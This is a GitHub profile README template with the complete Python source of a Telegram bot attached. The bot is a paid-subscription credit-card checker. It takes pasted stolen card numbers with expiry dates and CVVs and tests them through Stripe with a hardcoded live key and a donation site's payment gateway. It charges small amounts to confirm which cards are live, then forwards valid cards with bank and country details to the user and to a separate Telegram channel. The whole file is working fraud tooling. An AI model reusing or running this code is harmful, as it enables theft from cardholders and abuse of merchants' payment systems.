- 👋 Hi, I’m @anstop
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...

<!---
anstop/anstop is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
import requests
from aiogram import Bot, executor, types, Dispatcher
import logging
import re
import asyncio
import db as db
from aiogram.types import ReplyKeyboardRemove, \
    ReplyKeyboardMarkup, KeyboardButton, \
    InlineKeyboardMarkup, InlineKeyboardButton
import aiohttp
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.dispatcher import FSMContext
import configbot as cfg
import aiofiles
import datetime
import random
from pyqiwip2p import QiwiP2P
import time
import string
import io
import concurrent.futures

bot = Bot(token=cfg.TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot=bot, storage=storage)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

p2p = QiwiP2P(auth_key=cfg.QIWI)

button1 = KeyboardButton('👤 Профиль')
button_info = KeyboardButton('ℹ️ Информация о боте')
menu = ReplyKeyboardMarkup(resize_keyboard=True).add(button1, button_info)

balance = InlineKeyboardButton('📥 Пополнить', callback_data='Пополнить')
buy = InlineKeyboardButton('🛍️ Прайс', callback_data='Подписка')
close = InlineKeyboardButton('❌ Закрыть', callback_data='Закрыть')
inline_btn = InlineKeyboardMarkup()
inline_btn.row(balance, buy)
inline_btn.row(close)

day = InlineKeyboardButton('День', callback_data='День')
close2 = InlineKeyboardButton('❌ Закрыть', callback_data='Закрыть')
sub_day = InlineKeyboardMarkup()
sub_day.add(day)
sub_day.add(close2)

close1 = InlineKeyboardButton('❌ Закрыть', callback_data='Закрыть')
close_btn = InlineKeyboardMarkup()
close_btn.add(close1)

otm = KeyboardButton('❌ Отмена')
otmena = ReplyKeyboardMarkup(resize_keyboard=True).add(otm)

class Qiwi(StatesGroup):
    amount = State()

async def binchecker(bin):
    async with aiohttp.ClientSession(headers={}) as session:
        async with session.get(f"https://bins.antipublic.cc/bins/{bin}") as r:
            data1 = r.status
            if data1 == 200:
                data = await r.json()
                brand = ""
                country = ""
                flag = ""
                bank = ""
                level = ""
                type = ""
                binqq = ""
                try:
                    binqq = data['bin']
                except:
                    pass
                try:
                    brand = data["brand"]
                except:
                    pass
                try:
                    country = data["country_name"]
                except:
                    pass
                try:
                    flag = data["country_flag"]
                except:
                    pass
                try:
                    bank = data["bank"]
                except:
                    pass
                try:
                    level = data["level"]
                except:
                    pass
                try:
                    type = data["type"]
                except:
                    pass
                return binqq, brand, country, flag, bank, level, type
            else:
                return None

async def charge5(card, mm, yy, cvc):
    async with aiohttp.ClientSession() as session:
        t = session

        em = ''.join(random.choice(string.ascii_letters+string.digits) for i in range(6))
        ph = ''.join(random.choice(string.digits) for q in range(10))
        random_float = random.uniform(5, 10)
        charge = round(random_float, 1)
        print(charge)

        async with t.get("https://services.madinaapps.com/donation/clients/masdallas/paymentOptions/1809") as response:
            session_text = await response.text()

        data = {
            "card[number]": card,
            "card[cvc]": cvc,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "key": "pk_live_UPzOdF4iA4LQ8xKfLvThKNfL00Ox1uInDx"
        }

        async with t.post('https://api.stripe.com/v1/tokens', data=data) as response:
            id = await response.json()
            try:
                token = id['id']
            except:
                return "nevalid", charge

        json_data = {
            "email": "aksdok@gmail.com",
            "clientID": "ac5cf009-f90b-4fa2-89f7-f2992dd4bcbe",
            "amount": 1.00,
            "paymentMethod": token
        }

        async with t.post('https://app.theauxilia.com/gatewayapi/Merchant/InitializePayment', json=json_data) as response:
            setupintents = await response.json()
            if setupintents.get('error'):
                return setupintents['error']['message'], charge
            seti_secret = setupintents['token']
            seti = setupintents['intentID']

        data1 = {
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_UPzOdF4iA4LQ8xKfLvThKNfL00Ox1uInDx",
            "_stripe_account": "acct_1G1eZv2eZvKYlo2C",
            "client_secret": seti_secret
        }

        async with t.post(f'https://api.stripe.com/v1/setup_intents/{seti}/confirm', data=data1) as response:
            charge_result = await response.json()
        
        if charge_result.get('status') == 'succeeded':
            return '✅ Успешно (1$) 💎', charge
        elif charge_result.get('status') == 'requires_action':
            return 'Не поддерживается тип транзакции (1$) ❌', charge
        else:
            error_code = charge_result.get('error', {}).get('code', 'unknown_error')
            error_message = charge_result.get('error', {}).get('message', 'Неизвестная ошибка')
            return f'{error_message} {error_code} ❌', charge

async def stripecheck(card, mm, yy, cvc):
    print(card, mm, yy, cvc)
    result, charge = await charge5(card, mm, yy, cvc)
    if result == 'nevalid':
        return 'neevalid', charge
    elif 'Payment Failed' in result:
        reason = result.split('Payment Failed')[1].split('<span>')[1].split(';')[0]
        if reason == 'Your card has insufficient funds.':
            return 'nomoney', charge
        else:
            return 'novalid', charge
    else:
        return 'valid', charge

def process_card(cc):
    global response
    start_time = time.perf_counter()
    
    try:
        ccvalues = cc.replace(' ', '|').replace('/', '|').split('|')
        if len(ccvalues) != 4:
            raise ValueError(f"Неверный формат для карты: {cc}")
        card_number = ccvalues[0]
        exp_month = ccvalues[1]
        exp_year = ccvalues[2]
        cvv = ccvalues[3]
    except Exception as e:
        return f'Ошибка: {str(e)}'

    result, charge = asyncio.run(stripecheck(card_number, exp_month, exp_year, cvv))

    end_time = time.perf_counter()
    total = str(round(end_time - start_time, 1))
    return f'💳 Карта: {cc}\n📍{result}\nВремя: {total}с\n✨ Checker by @dillacoder'

def buy_menu(isurl=True, url="", bill=""):
    qiwimenu = InlineKeyboardMarkup(row_width=1)
    if isurl:
        btnurlqiwi = InlineKeyboardButton(text='Ссылка на оплату', url=url)
        qiwimenu.insert(btnurlqiwi)
    btncheckqiwi = InlineKeyboardButton(text='🔎 Проверить оплату', callback_data='check_'+bill)
    qiwimenu.insert(btncheckqiwi)
    return qiwimenu



def days_to_seconds(days):
    return days * 24 * 60 * 60


def time_sub_day(get_time):
    time_now = int(time.time())
    middle_time = int(get_time) - time_now

    if middle_time <= 0:
        return False
    else:
        dt = str(datetime.timedelta(seconds=middle_time))
        dt = dt.replace("days", "дней")
        dt = dt.replace("day", "день")
        return dt

@dp.message_handler(commands='start')
async def start(message: types.Message):
    if message.chat.type == 'private':
        if len(await db.user_exists(message.from_user.id)) == 0:
            #print(len(await db.user_exists(message.from_user.id)))
            await db.add_user(message.from_user.id)
            for message.from_user.id in cfg.ADMINS:
                await bot.send_message(message.from_user.id, f'<b>Новый пользователь: @{message.from_user.username}</b>',parse_mode='html')
        await message.reply(f"""<b>👋 Привет <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> Используй кнопки для функционала бота</b>""",reply_markup=menu, parse_mode="html")

@dp.callback_query_handler(text='Закрыть', state="*")
async def process_callback_button1(callback_query: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await callback_query.message.delete()

@dp.message_handler(text="❌ Отмена", state="*")
async def check_id(message: types.Message, state: FSMContext):
    if message.chat.type == "private":
        await message.reply(f"<b>Отменено</b>", reply_markup=menu, parse_mode='html')
        await state.finish()

@dp.message_handler(text="👤 Профиль")
async def check_id(message: types.Message):
    if message.chat.type == "private":
        cards = await db.user_card(message.from_user.id)
        balance = await db.user_money(message.from_user.id)
        user_sub = time_sub_day(await db.get_time_sub(message.from_user.id))
        if user_sub == False:
            await message.reply(f"""<b>👤 Профиль</b>
    
<b>🆔 Ваш айди:</b> <code>{message.from_user.id}</code>
<b>🗓 Дата регистрации:</b> <code>{await db.data()}</code>
<b>💵 Баланс:</b> <code>{balance}</code>₽
<b>🛍️ Подписка:</b> ❌

<b>💳 Проверено карт:</b> <code>{cards}</code>""", reply_markup=inline_btn , parse_mode='html')
        else:
            await message.reply(f"""<b>👤 Профиль</b>

<b>🆔 Ваш айди:</b> <code>{message.from_user.id}</code>
<b>🗓 Дата регистрации:</b> <code>{await db.data()}</code>
<b>💵 Баланс:</b> <code>{balance}</code>₽
<b>🛍️ Подписка:</b> <code>✅ {user_sub}</code>

<b>💳 Проверено карт:</b> <code>{cards}</code>""", reply_markup=inline_btn, parse_mode='html')

@dp.callback_query_handler(text="Пополнить", state="*")
async def popol(callback: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await bot.delete_message(callback.from_user.id, callback.message.message_id)
    await bot.send_message(callback.from_user.id, f"<b>Введите сумму для пополнения:</b>", parse_mode='html', reply_markup=otmena)
    await Qiwi.amount.set()

@dp.message_handler(state=Qiwi.amount)
async def mess(message: types.Message, state: FSMContext):
    if message.chat.type == "private":
        if message.text != '❌ Отмена':
            if message.text.isdigit():
                message_money = int(message.text)
                if message_money:
                    await state.finish()
                    comment = str(message.from_user.id)
                    bill = p2p.bill(amount=message_money, lifetime=30, comment=comment)
                    await db.add_check(message.from_user.id, message_money, bill.bill_id)
                    await bot.send_message(message.from_user.id, f"""<b>💰 Счёт на оплату создан!</b>
<b>🥝 Оплата через:</b> Qiwi/Card
<b>💵 Сумма оплаты:</b> <code>{message_money}</code>₽
<b>💬 Комментарий:</b> <code>{comment}</code>
➖➖➖➖➖➖➖➖➖➖
<b>⏱️ Счёт действителен:</b> <code>30 минут</code> """, parse_mode='html', reply_markup=buy_menu(url=bill.pay_url, bill=bill.bill_id))
            else:
                await bot.send_message(message.from_user.id, f'<b>Пришли число!</b>',parse_mode='html')
                return
        else:
            await state.finish()
            await message.reply('<b>Отменено</b>', reply_markup=types.ReplyKeyboardRemove(), parse_mode='html')

@dp.callback_query_handler(text_contains="check_")
async def check(callback: types.CallbackQuery):
    bill = str(callback.data[6:])
    info = await db.get_check(bill)
    if info != False:
        bill_status = str(p2p.check(bill_id=bill).status)
        print(bill_status)
        if bill_status == "PAID":
            user_money = await db.user_money(callback.from_user.id)
            moneyy = int(info[2])
            await db.set_money(callback.from_user.id, user_money+moneyy)
            await bot.delete_message(callback.from_user.id, callback.message.message_id)
            await bot.send_message(callback.from_user.id, f'<b>Спасибо за оплату, ваш счет пополнен!</b>', parse_mode='html')
            db.delete_check(bill_id=bill)
        else:
            await bot.send_message(callback.from_user.id, f'<b>❌ Вы не оплатили счет!</b>', parse_mode='html')
    else:
        await bot.send_message(callback.from_user.id, f'<b>❌ Счет не найден!</b>', parse_mode='html')

@dp.callback_query_handler(text_contains="Подписка")
async def subd(callback: types.CallbackQuery):
    await bot.delete_message(callback.from_user.id, callback.message.message_id)
    await bot.send_message(callback.from_user.id, f"<b>Подписка на день 300 рублей</b>", parse_mode='html', reply_markup=sub_day)

@dp.callback_query_handler(text_contains="День")
async def subd(callback: types.CallbackQuery):
    balance = await db.user_money(callback.from_user.id)
    if balance >= 300:
        balance -= 300
        await db.set_money(callback.from_user.id, balance)
        time_sub = int(time.time()) + days_to_seconds(1)
        await db.set_time_sub(callback.from_user.id, time_sub)
        await bot.edit_message_text("😳 Вы приобрели подписку!", callback.from_user.id, callback.message.message_id)
    else:
        await bot.edit_message_text("😔 У вас недостаточно средств!", callback.from_user.id, callback.message.message_id)

@dp.message_handler(commands="bin")
async def cc(message: types.Message):
    asd = re.findall('[0-9]{6}', message.text)
    if asd == []:
        await message.reply("Неверный BIN!")
        return
    bin = asd[0][:6]
    pm = await binchecker(bin)
    if pm == None:
        await message.reply("Неверный BIN!")
        return
    binqq, brand, country, flag, bank, level, type = pm
    await message.reply(f"""💳 BIN: <code>{binqq}</code>
💼 Брэнд: <b>{brand}</b>
📒 Тип: <b>{type}</b>
📊 Уровень: <b>{level}</b>
💵 Банк: <b>{bank}</b>
{flag} Страна: <b>{country}</b>""", parse_mode="HTML")

#info
@dp.message_handler(text="ℹ️ Информация о боте")
async def check_id(message: types.Message):
    if message.chat.type == "private":
        all = await db.all_users()
        await message.reply(f"""<b>👥 Количество юзеров в боте:</b> <code>{all}</code>
➖➖➖➖➖➖➖➖➖➖
<b>⚙️ Команды:</b>
<b>/bin - Проверка бина карты</b>
<b>Проверка EU карт [WORK]:</b>
<b>Кидайте карты сообщением в любом формате</b>
➖➖➖➖➖➖➖➖➖➖
<b>👨‍💻 Admin: @hasscvv</b>""", parse_mode="html", reply_markup=close_btn)

@dp.message_handler(commands='sendall')
async def start(message: types.Message):
    if message.chat.type == 'private':
        if message.from_user.id in cfg.ADMINS:
            text = message.text[9:]
            users = await db.get_user()
            success_count = 0
            fail_count = 0
            for row in users:
                try:
                    await bot.send_message(row[0], text, parse_mode='Markdown')
                    if int(row[1]) != 1:
                        await db.set_active(row[0], 1)
                        fail_count += 1
                except:
                    await db.set_active(row[0], 0)
                    success_count += 1
            await bot.send_message(message.from_user.id, f"""<b>🤖 Рассылка завершена!</b>
<b>🙂 Успешно:</b> {success_count}
<b>🤕 Неудачно:</b> {fail_count}""", parse_mode='html')

@dp.message_handler(commands="add")
async def get_checks(message: types.Message):
    if message.chat.type == "private":
        if message.from_user.id in cfg.ADMINS:
            user_id = str(message.text)[5:]
            time_sub = int(time.time()) + days_to_seconds(1)
            await db.set_time_sub(user_id, time_sub)
            await message.reply("👻 Подписка выдана успешно!")
        else:
            pass

@dp.message_handler(commands="del")
async def get_checks(message: types.Message):
    if message.chat.type == "private":
        if message.from_user.id in cfg.ADMINS:
            user_id = str(message.text)[5:]
            time_sub = int(time.time()) + days_to_seconds(0)
            await db.set_time_sub(user_id, time_sub)
            await message.reply("👻 Подписка удалена успешно!")
        else:
            pass

ccsearch = r'[0-9]{16}[|][0-9]{2}[|][0-9]{2}[|][0-9]{3}|' \
          r'[0-9]{16}[|][0-9]{2}[|]20[0-9]{2}[|][0-9]{3}|' \
          r'[0-9]{16}[/][0-9]{2}[/]20[0-9]{2}[/][0-9]{3}|' \
          r'[0-9]{16}[/][0-9]{2}[/][0-9]{2}[/][0-9]{3}|' \
          r'[0-9]{16}[ ][0-9]{2}[/][0-9]{2}[ ][0-9]{3}|' \
          r'[0-9]{16}[ ][0-9]{2}[/]20[0-9]{2}[ ][0-9]{3}|' \
          r'[0-9]{16}[ ][0-9]{2}[ ][0-9]{2}[ ][0-9]{3}|' \
          r'[0-9]{16}[ ][0-9]{2}[ ]20[0-9]{2}[ ][0-9]{3}|' \
          r'[0-9]{16}[:][0-9]{2}[:][0-9]{2}[:][0-9]{3}|' \
          r'[0-9]{16}[:][0-9]{2}[:]20[0-9]{2}[:][0-9]{3}'


@dp.message_handler(content_types=['text'])
async def ultracc(message: types.Message):
    if message.chat.type == "private":
        cc_list = re.findall(ccsearch, message.text)
        print(cc_list)
        if cc_list == []:
            pass
            return
        user_sub = await db.get_time_sub(message.from_user.id)
        if user_sub:
            user_sub = datetime.datetime.fromtimestamp(user_sub)
            if user_sub > datetime.datetime.now():
                sd = 200
                novalid = 0
                valid = 0
                no_money = 0
                error = 0
                random_queue = random.randint(10000, 99999)
                if len(cc_list) > sd:
                    await message.reply("<b>❗️ Максимальное количество "+ str(sd) +" cc, вы загрузили " + str(len(cc_list)) + "</b>", parse_mode='HTML')
                    return
                else:
                    z = await message.reply(f"<b>⚡️ Карты добавлены в очередь #{random_queue}\nПроверяется {len(cc_list)} карт</b>", parse_mode='HTML')
                    async with aiohttp.ClientSession() as session:
                        tasks = []
                        for cc in cc_list:
                            try:
                                fg = cc.replace(' ', '|')
                                fg = fg.replace('/', '|')
                                fg = fg.replace(':', '|')
                                asd = fg.split("|")
                                if len(asd[2]) == 4:
                                    asd[2] = asd[2][-2:]
                                task = asyncio.ensure_future(stripecheck(asd[0], asd[1], asd[2], asd[3]))
                                tasks.append(task)
                            except Exception as e:
                                print(e)
                        responses = await asyncio.gather(*tasks)
                        for response in responses:
                            print(response)
                            result, charge = response
                            # await z.edit_text(f'<b>⚡️ Карты добавлены в очередь #{random_queue}\n🤖 Проверено {i}/{len(cc_list)}</b>', parse_mode='HTML')
                            # await asyncio.sleep(1)
                            if result == 'valid':
                                  valid += 1
                                  bin = asd[0]
                                  binqq, brand, country, flag, bank, level, type = await binchecker(bin)
                                  await bot.send_message(message.from_user.id,
                                                         f'''<b>✅ Новая валидка (-<code>{charge}$</code>)</b>
<b>💳 Карта:</b> <code>{asd[0]}|{asd[1]}|{asd[2]}|{asd[3]}</code>

<b>🌐 Тип:</b> {type}
<b>🏦 Банк:</b> {bank}
<b>⚛️ Уровень:</b> {level}
<b>{flag} Страна:</b> {country}''', parse_mode='HTML')
                                  await bot.send_message(-1001610053028,
                                                         f'''<b>✅ Новая валидка (-<code>{charge}$</code>)</b>
<b>💳 Карта:</b> <code>{asd[0]}|{asd[1]}|{asd[2]}|{asd[3]}</code>

<b>🌐 Тип:</b> {type}
<b>🏦 Банк:</b> {bank}
<b>⚛️ Уровень:</b> {level}
<b>{flag} Страна:</b> {country}''', parse_mode='HTML')
                            if result == 'nomoney':
                                  no_money += 1
                                  bin = asd[0]
                                  binqq, brand, country, flag, bank, level, type = await binchecker(bin)
                                  await bot.send_message(message.from_user.id, f'''<b>💳 Карта:</b> <code>{asd[0]}|{asd[1]}|{asd[2]}|{asd[3]}</code>
<b>👻 Результат:</b> <i>Списание (-{charge}$) 💵</i>

<b>🌐 Тип:</b> {type}
<b>🏦 Банк:</b> {bank}
<b>⚛️ Уровень:</b> {level}
<b>{flag} Страна:</b> {country}''', parse_mode='HTML')
                                  await bot.send_message(-1001610053028,
                                                         f'''<b>💳 Карта:</b> <code>{asd[0]}|{asd[1]}|{asd[2]}|{asd[3]}</code>
<b>👻 Результат:</b> <i>Списание (-{charge}$) 💵</i>

<b>🌐 Тип:</b> {type}
<b>🏦 Банк:</b> {bank}
<b>⚛️ Уровень:</b> {level}
<b>{flag} Страна:</b> {country}''', parse_mode='HTML')
                            if result == 'novalid':
                                novalid += 1
                            if result == 'neevalid':
                                error += 1
                    cardscount = novalid+error+valid+no_money
                    await db.add_card(cardscount, message.from_user.id)
                    await z.edit_text(
                        f'<b>Очередь #{random_queue}\n💳 Проверено {len(cc_list)} СС\n📊 Результаты проверки:\n❌ Невалидные: {novalid+error}\n✅ Валидные: {valid}\n💵 Нет денег: {no_money}</b>', parse_mode='HTML')
        else:
            await message.reply(f"<b>😕 У тебя нет подписки!</b>", parse_mode='html')

# @dp.message_handler(content_types=['text'])
# async def ultracc(message: types.Message):
#     if message.chat.type == "private":
#         cc_list_1 = re.findall(r'[0-9]{16}[|][0-9]{2}[|][0-9]{2}[|][0-9]{3}', message.text)
#         cc_list_2 = re.findall(r'[0-9]{16}[|][0-9]{2}[|]20[0-9]{2}[|][0-9]{3}', message.text)
#         cc_list_3 = re.findall(r'[0-9]{16}[/][0-9]{2}[/]20[0-9]{2}[/][0-9]{3}', message.text)
#         cc_list_4 = re.findall(r'[0-9]{16}[/][0-9]{2}[/][0-9]{2}[/][0-9]{3}', message.text)
#         cc_list_5 = re.findall(r'[0-9]{16}[ ][0-9]{2}[/][0-9]{2}[ ][0-9]{3}', message.text)
#         cc_list_6 = re.findall(r'[0-9]{16}[ ][0-9]{2}[/]20[0-9]{2}[ ][0-9]{3}', message.text)
#         cc_list_7 = re.findall(r'[0-9]{16}[ ][0-9]{2}[ ][0-9]{2}[ ][0-9]{3}', message.text)
#         cc_list_8 = re.findall(r'[0-9]{16}[ ][0-9]{2}[ ]20[0-9]{2}[ ][0-9]{3}', message.text)
#         cc_list_9 = re.findall(r'[0-9]{16}[:][0-9]{2}[:][0-9]{2}[:][0-9]{3}', message.text)
#         cc_list_10 = re.findall(r'[0-9]{16}[:][0-9]{2}[:]20[0-9]{2}[:][0-9]{3}', message.text)
#         cc_list = cc_list_1 + cc_list_2 + cc_list_3 + cc_list_4 + cc_list_5 + cc_list_6 + cc_list_7 + cc_list_8 + cc_list_9 + cc_list_10
#         print(cc_list)
#         if cc_list == []:
#             pass
#             return
#         # print(user_sub)
#         user_sub = await db.get_time_sub(message.from_user.id)
#         if user_sub:
#             user_sub = datetime.datetime.fromtimestamp(user_sub)
#             if user_sub > datetime.datetime.now():
#                 i = 0
#                 sd = 200
#                 random_queue = random.randint(10000, 99999)
#                 if len(cc_list) > sd:
#                     await message.reply("<b>❗️ Максимальное количество "+ str(sd) +" cc, вы загрузили " + str(len(cc_list)) + "</b>", parse_mode='HTML')
#                     return
#                 else:
#                     z = await message.reply(f"<b>⚡️ Карты добавлены в очередь #{random_queue}</b>", parse_mode='HTML')
#                     for cc in cc_list:
#                       try:
#                           while True:
#                               fg = cc.replace(' ', '|')
#                               fg = fg.replace('/', '|')
#                               fg = fg.replace(':', '|')
#                               asd = fg.split("|")
#                               if len(asd[2]) == 4:
#                                   asd[2] = asd[2][-2:]
#                               result, charge = await stripecheck(asd[0], asd[1], asd[2], asd[3])
#                               i += 1
#                               await z.edit_text(f'<b>⚡️ Карты добавлены в очередь #{random_queue}\n🤖 Проверено {i}/{len(cc_list)}</b>', parse_mode='HTML')
#                               if result == 'valid':
#                                   bin = asd[0]
#                                   binqq, brand, country, flag, bank, level, type = await binchecker(bin)
#                                   await bot.send_message(message.from_user.id,
#                                                          f'''<b>✅ Новая валидка (-<code>{charge}$</code>)</b>
# <b>💳 Карта:</b> <code>{asd[0]}|{asd[1]}|{asd[2]}|{asd[3]}</code>
#
# <b>🌐 Тип:</b> {type}
# <b>🏦 Банк:</b> {bank}
# <b>⚛️ Уровень:</b> {level}
# <b>{flag} Страна:</b> {country}''', parse_mode='HTML')
#                                   await bot.send_message(-1001610053028,
#                                                          f'''<b>✅ Новая валидка (-<code>{charge}$</code>)</b>
# <b>💳 Карта:</b> <code>{asd[0]}|{asd[1]}|{asd[2]}|{asd[3]}</code>
#
# <b>🌐 Тип:</b> {type}
# <b>🏦 Банк:</b> {bank}
# <b>⚛️ Уровень:</b> {level}
# <b>{flag} Страна:</b> {country}''', parse_mode='HTML')
#                               if result == 'nomoney':
#                                   bin = asd[0]
#                                   binqq, brand, country, flag, bank, level, type = await binchecker(bin)
#                                   await bot.send_message(message.from_user.id, f'''<b>💳 Карта:</b> <code>{asd[0]}|{asd[1]}|{asd[2]}|{asd[3]}</code>
# <b>👻 Результат:</b> <i>Списание (-{charge}$) 💵</i>
#
# <b>🌐 Тип:</b> {type}
# <b>🏦 Банк:</b> {bank}
# <b>⚛️ Уровень:</b> {level}
# <b>{flag} Страна:</b> {country}''', parse_mode='HTML')
#                                   await bot.send_message(-1001610053028,
#                                                          f'''<b>💳 Карта:</b> <code>{asd[0]}|{asd[1]}|{asd[2]}|{asd[3]}</code>
# <b>👻 Результат:</b> <i>Списание (-{charge}$) 💵</i>
#
# <b>🌐 Тип:</b> {type}
# <b>🏦 Банк:</b> {bank}
# <b>⚛️ Уровень:</b> {level}
# <b>{flag} Страна:</b> {country}''', parse_mode='HTML')
#                               break
#                       except Exception as err:
#                           print(err)
#                           await message.reply(f"⚠️ Произошла ошибка!")
#                           break
#         elif not user_sub:
#             await message.reply(f"<b>😕 У тебя нет подписки!</b>", parse_mode='html')


if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
